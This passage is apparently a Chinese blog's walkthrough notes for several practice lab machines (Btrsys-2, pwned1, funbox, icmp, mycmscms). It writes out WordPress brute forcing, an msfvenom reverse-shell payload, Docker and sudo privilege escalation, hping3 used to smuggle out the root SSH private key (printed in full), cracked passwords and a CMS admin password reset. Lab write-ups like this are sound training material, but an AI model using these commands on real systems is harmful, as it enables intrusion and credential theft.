<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh lucy@192.168.111.131 -p 1337</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">sudo -l</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">import pty;pty.spawn(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="Btrsys-2"><a href="#Btrsys-2" class="headerlink" title="Btrsys-2"></a>Btrsys-2</h2><p>信息搜集，发现wordpress</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.111.132/wordpress -e u</span><br></pre></td></tr></table></figure>

<p>枚举用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin admin 弱口令直接进入</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f raw &gt; ./shell.php</span><br></pre></td></tr></table></figure>

<p>弹不出来，歇菜</p>
<p>下一个</p>
<h2 id="pwned1"><a href="#pwned1" class="headerlink" title="pwned1"></a>pwned1</h2><p>信息搜集</p>
<p>发现ftp 服务，但是好像匿名登录不了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.56.110/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hidden_text/secret.dic</span><br><span class="line">/pwned.vuln/</span><br><span class="line">查看源码即可看到登录账号密码</span><br></pre></td></tr></table></figure>

<p>登录后在用户下发现，id_rsa 登录</p>
<p>然后赋予权限登录，sudo -l,看到这个文件，(selena) NOPASSWD: &#x2F;home&#x2F;messenger.sh</p>
<p>这个显然是有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name </span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">                echo &quot;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u selena /home/messenger.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815214410.png"></p>
<h3 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -v /:/mnt  -it alpine</span><br><span class="line">cd/ mnt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815220155.png"></p>
<h2 id="funbox"><a href="#funbox" class="headerlink" title="funbox"></a>funbox</h2><p>列举用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/  -e u</span><br><span class="line">admin joe</span><br></pre></td></tr></table></figure>

<p>爆破密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ -U admin -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>admin : iubire</p>
<p>joe : 12345</p>
<p>ssh登录 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i 绕过rbash</span><br></pre></td></tr></table></figure>

<p>cd &#x2F;funny下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现 ./backup.sh 可以写入</span><br><span class="line">reminder 提示他是个定时文件写入反弹shell</span><br><span class="line">监听，多试几次</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230826211905.png"></p>
<h2 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h2><p>信息搜集啥也没有</p>
<p>看一眼网页</p>
<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001245.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">searchsploit monitorr</span><br><span class="line">searchsploit -p php/webapps/48980.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shell.php http://192.168.56.113/mon 192.168.56.105 4444</span><br></pre></td></tr></table></figure>

<p>得到shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh devel/ </span><br><span class="line"> cat crypt.php&lt;?phpecho crypt(&#x27;BUHNIJMONIBUVCYTTYVGBUHJNI&#x27;,&#x27;da&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>这个即是fox 的密码BUHNIJMONIBUVCYTTYVGBUHJNI</p>
<p>登路 sudo -l</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用hping3读取root用户的私钥文件</span><br></pre></td></tr></table></figure>

<p>连接两个ssh 终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#发送端</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --data 5000 --sign signature --file /root/.ssh/id_rsa</span><br><span class="line">​</span><br><span class="line">#接收端</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --listen signature --safe</span><br></pre></td></tr></table></figure>

<p>保存为id_rsa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqcCz/pKzjVNZi9zdKJDkvhMhY8lOb2Qth8e/3bLJ/ssgmRLoJXAQ</span><br><span class="line">sGF3lKw7MFJ4Kl6mrbod2w8EMfULTjW6OhwZ8txdNmTDkbof4irIm93oQgrqMy8/2GwF/k</span><br><span class="line">Sf84k8Yem6gRUhDDnYcKLF2Q2mBJW9WRSDImYVkZX8n/30GrUpHN7cVGCsKsuTxfZI4n3E</span><br><span class="line">fj90y0zlpUgtpdVAtOcYfhR6tXsuoKfPCD8H0N/0XEKVAHaQGWkL/EAGQqPuqGMTGLv62y</span><br><span class="line">lL8bpVdeAaol6aJdxAT3aglxOcuhdgHFAPVHeojGtIaNmpiPq0fIWZtV3gJiSRum7GBGUR</span><br><span class="line">+aWhN6ZEnn7WuOuOjibtULNadnIEyPP7xplEcoHWeeDvM060MtLx1ojv8eg23bAvd/ppsy</span><br><span class="line">UiOw2/AJGd5HnRH9yFZCXzJ+bga6oV2SH95B/pfBc0sKD5In/r4CFW+NTUH5Z3iX2dQZdo</span><br><span class="line">QnKiZjKK4aAsLcjLX3VzANr7WO6RLanxAffL0xFxAAAFiEC+3VBAvt1QAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKnAs/6Ss41TWYvc3SiQ5L4TIWPJTm9kLYfHv92yyf7LIJkS6CVwELBhd5SsOzBS</span><br><span class="line">eCpepq26HdsPBDH1C041ujocGfLcXTZkw5G6H+IqyJvd6EIK6jMvP9hsBf5En/OJPGHpuo</span><br><span class="line">EVIQw52HCixdkNpgSVvVkUgyJmFZGV/J/99Bq1KRze3FRgrCrLk8X2SOJ9xH4/dMtM5aVI</span><br><span class="line">LaXVQLTnGH4UerV7LqCnzwg/B9Df9FxClQB2kBlpC/xABkKj7qhjExi7+tspS/G6VXXgGq</span><br><span class="line">JemiXcQE92oJcTnLoXYBxQD1R3qIxrSGjZqYj6tHyFmbVd4CYkkbpuxgRlEfmloTemRJ5+</span><br><span class="line">1rjrjo4m7VCzWnZyBMjz+8aZRHKB1nng7zNOtDLS8daI7/HoNt2wL3f6abMlIjsNvwCRne</span><br><span class="line">R50R/chWQl8yfm4GuqFdkh/eQf6XwXNLCg+SJ/6+AhVvjU1B+Wd4l9nUGXaEJyomYyiuGg</span><br><span class="line">LC3Iy191cwDa+1jukS2p8QH3y9MRcQAAAAMBAAEAAAGAAiBk4NqLn0idBZCFwL1X8D2jHH</span><br><span class="line">HoJqMVou7Qq4FS4HtA9En1WIq32s3NxrIFp8xQrw8yfVioiRb+EXYlZxxrMdEqTg2OqWDH</span><br><span class="line">xmqTfazViIZWI4Wpe2yrGxX3WUEY098zP3LDIFzYZiPPX1HasqZmHwaVMal9HxAyUvmTCZ</span><br><span class="line">oP1cnRMwhjsDbp0TttpXw5W4UB0icPWoCjG9f0onAyeFGwz9uH0gAyDFct08eeXHKByCoZ</span><br><span class="line">XcEeewMC4G0Y5vrQwZFEJcEP7+FES0RHCT8itoeC51t4HOtHLX5BKcApf8cAp3LK8alEl3</span><br><span class="line">lJfLklX2Rm8v9l4RjWxxAgFpmY5o4PeXLeKP6/35VewAmMwNiZ17J/MOUMsj/2SCNxYh7Z</span><br><span class="line">LmIIL9B65ipd/L7RXSbFhpGbT6jyOYzDI8D6VGwCEhMiVITntyh5YvimgZTzlP3zmTsxX5</span><br><span class="line">lmyAn/RIJ6tXnXIkmGw1QjHfS0eI5ny+vR8SlmDnTlF1LFk65+qY42sWWeVweP4tkxAAAA</span><br><span class="line">wDvG1aNPq532hZw+P5NzrocyRSu4GfmygSpZY13OTtKGPDjQMPwABPYFOYS/cul0i9mpS1</span><br><span class="line">SeBllnDJbEwM3/iH6k/YlEuT7tIKeRbx/8MTAjkCO0sBWyA4k3tFbupsZu2/jWOxrcUgeH</span><br><span class="line">1833FdCX/EyAzBDirDopqYmR77SDERqOYLbwgv6r2J6rj4FboRemx2T1XRo+DJOczlU0yJ</span><br><span class="line">vTKQRbCFe3+Z5ZYkMg3SCvMsbu1vj+f9pu0uG84s3R3FFGYAAAAMEA0aLIF8pXABXUD+60</span><br><span class="line">bIXpizYMoodJHl02C17wBjMWVzEYah6Vq+ZvoOvqMISkeIIhDUf8jwgaFVYkv/Nr33qmSN</span><br><span class="line">FsEms4d8vJ9c8MFWykmxvmSwVh26G0DQxlASZ3exgyqmnCl9LSGwY0W4brH6nOrKRBKDTH</span><br><span class="line">xeMBxuxNdkfU6ABy5NbrSmMnQP/bLozC1GJlyB4TAvvK/PH29L8ncSzsx9KimV4eM3fv1j</span><br><span class="line">5x+VwcOnMnbzg8F1RrA5O6xJfYMnQVAAAAwQDPS88AHHxqwqg2LocOLQ6AVyqDB6IRDiDV</span><br><span class="line">mI4KG5dALS8EnHGmObVhx6qiwi09X666eDen2G/W1bVc8X9lyJVVtKEdOhLrizkPAqY3wW</span><br><span class="line">9V/kC7S2DX0aDYpVyZTSpeV63SPHCrN1jryAQMMgz+CswS7/sIqEUAPNqMAxzoziR3WBIG</span><br><span class="line">qEx5FmhFueiELGZjVJiEPAWbbsFRdskr4eYfhJ+bz91G5aJXpIJqsNw829TOXf/3439Rix</span><br><span class="line">q/qSihL6WLsu0AAAAQcm9vdEBjYWxpcGVuZHVsYQECAw==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001809.png"></p>
<h2 id="mycmscms"><a href="#mycmscms" class="headerlink" title="mycmscms"></a>mycmscms</h2><p>22 端口 80 端口 3306 端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p -h 192.168.56.102 </span><br><span class="line">root 弱密码登录</span><br><span class="line">show global variables like &quot;secure%&quot;;</span><br><span class="line">查看能否写入文件</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230904195052.png"></p>
<p>无法写入查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from cms_users;</span><br><span class="line">发现 admin 无法解开</span><br><span class="line">hashid fb67c6d24e756229aab021cea7605fb3</span><br></pre></td></tr></table></figure>

<p><a href="http://viewsvn.cmsmadesimple.org/listing.php?repname=cmsmadesimple&path=/&sc=0">http://viewsvn.cmsmadesimple.org/listing.php?repname=cmsmadesimple&amp;path=%2F&amp;sc=0</a></p>
<p>源码下载地址 ，在branch 2.2.17 版本下载下来进行审计</p>
<p>admin&#x2F;login.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        if( !$username || !$password ) throw new \LogicException(lang(&#x27;usernameincorrect&#x27;));</span><br><span class="line"></span><br><span class="line">        // load user by name</span><br><span class="line">        // do hooks for authentication</span><br><span class="line">        $oneuser = $userops-&gt;LoadUserByUsername($username, $password, TRUE, TRUE);</span><br><span class="line">        // $oneuser = $userops-&gt;LoadUserByUsername($username, $password, TRUE, TRUE);</span><br></pre></td></tr></table></figure>

<p>跟进LoadUserByUsername </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LoadUserByUsername</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$activeonly</span> = <span class="literal">true</span>, <span class="variable">$adminaccessonly</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// note: does not use cache</span></span><br><span class="line">		<span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="variable">$gCms</span> = <span class="title class_">CmsApp</span>::<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">		<span class="variable">$db</span> = <span class="variable">$gCms</span>-&gt;<span class="title function_ invoke__">GetDb</span>();</span><br><span class="line"></span><br><span class="line">		<span class="variable">$params</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$where</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$joins</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="variable">$query</span> = <span class="string">&quot;SELECT u.user_id FROM &quot;</span>.CMS_DB_PREFIX.<span class="string">&quot;users u&quot;</span>;</span><br><span class="line">		<span class="variable">$where</span>[] = <span class="string">&#x27;username = ?&#x27;</span>;</span><br><span class="line">		<span class="variable">$params</span>[] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$password</span> != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$where</span>[] = <span class="string">&#x27;password = ?&#x27;</span>;</span><br><span class="line">			<span class="variable">$params</span>[] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_site_preference</span>(<span class="string">&#x27;sitemask&#x27;</span>,<span class="string">&#x27;&#x27;</span>).<span class="variable">$password</span>);</span><br><span class="line">		&#125; <span class="comment">//从这里可以看出md5拼接加密</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$activeonly</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="variable">$joins</span>[] = CMS_DB_PREFIX.<span class="string">&quot;user_groups ug ON u.user_id = ug.user_id&quot;</span>;</span><br><span class="line">			<span class="variable">$where</span>[] = <span class="string">&quot;u.active = 1&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$adminaccessonly</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="variable">$where</span>[] = <span class="string">&quot;admin_access = 1&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">empty</span>(<span class="variable">$joins</span>) ) <span class="variable">$query</span> .= <span class="string">&#x27; LEFT JOIN &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; LEFT JOIN &#x27;</span>,<span class="variable">$joins</span>);</span><br><span class="line">		<span class="keyword">if</span>( !<span class="keyword">empty</span>(<span class="variable">$where</span>) ) <span class="variable">$query</span> .= <span class="string">&#x27; WHERE &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; AND &#x27;</span>,<span class="variable">$where</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$id</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="variable">$query</span>,<span class="variable">$params</span>);</span><br><span class="line">		<span class="keyword">if</span>( <span class="variable">$id</span> ) <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">LoadUserByID</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>向get_site_preference传入一个sitemask 和空值，然后跟进get_site_preference</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function get_site_preference($prefname, $defaultvalue = &#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">  return cms_siteprefs::get($prefname,$defaultvalue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 cms_siteprefs的的get类$prefname传入一个sitemask</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.2.17-b.4-JoMorg.r13053/lib/classes/class.cms_siteprefs.php</span><br></pre></td></tr></table></figure>

<p>$key的值为sitemask</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$dflt</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="variable">$prefs</span> = global_cache::<span class="title function_ invoke__">get</span>(<span class="keyword">__CLASS__</span>);</span><br><span class="line">	<span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable">$prefs</span>[<span class="variable">$key</span>]) )  <span class="keyword">return</span> <span class="variable">$prefs</span>[<span class="variable">$key</span>];</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$dflt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先他get了这个类本身，如果key这个参数不为空的话，就通过$key去$prefs拿，而$prefs则是去global_cache的缓存中去拿的,所有去看看这个类初始化时候的动作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> \CMSMS\internal\<span class="title function_ invoke__">global_cachable</span>(<span class="keyword">__CLASS__</span>,function()&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">_read</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    global_cache::<span class="title function_ invoke__">add_cachable</span>(<span class="variable">$obj</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用时使用了_read</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$db</span> = <span class="title class_">CmsApp</span>::<span class="title function_ invoke__">get_instance</span>()-&gt;<span class="title function_ invoke__">GetDb</span>();</span><br><span class="line">		<span class="keyword">if</span>( !<span class="variable">$db</span> ) <span class="keyword">return</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="string">&#x27;SELECT sitepref_name,sitepref_value FROM &#x27;</span>.CMS_DB_PREFIX.<span class="string">&#x27;siteprefs&#x27;</span>;</span><br><span class="line">		<span class="variable">$dbr</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">GetArray</span>(<span class="variable">$query</span>);</span><br><span class="line">		<span class="keyword">if</span>( <span class="title function_ invoke__">is_array</span>(<span class="variable">$dbr</span>) ) &#123;</span><br><span class="line">			<span class="variable">$_prefs</span> = <span class="keyword">array</span>();</span><br><span class="line">			<span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$dbr</span>); <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">				<span class="variable">$row</span> = <span class="variable">$dbr</span>[<span class="variable">$i</span>];</span><br><span class="line">				<span class="variable">$_prefs</span>[<span class="variable">$row</span>[<span class="string">&#x27;sitepref_name&#x27;</span>]] = <span class="variable">$row</span>[<span class="string">&#x27;sitepref_value&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_prefs</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT sitepref_value FROM cms_siteprefs where sitepref_name=&#x27;sitemask&#x27;;</span><br></pre></td></tr></table></figure>

<p>修改数据库密码，然后登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE cms_users SET password=&#x27;26abf34a26d74ef992a647963895b726&#x27; WHERE username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>上传木马发现无法正向连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</span><br></pre></td></tr></table></figure>

<p>反弹木马，也可以用msf 生成木马</p>
<p>然后卡利监听端口，访问激活木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/admin</span><br><span class="line">cat .htpasswd</span><br><span class="line">TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=s</span><br><span class="line">armour:Shield@123</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">su armour</span><br><span class="line">sudo -l 发现python suid提权</span><br><span class="line">sudo python -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230906111524.png"></p>
]]></content>
  </entry>
</search>
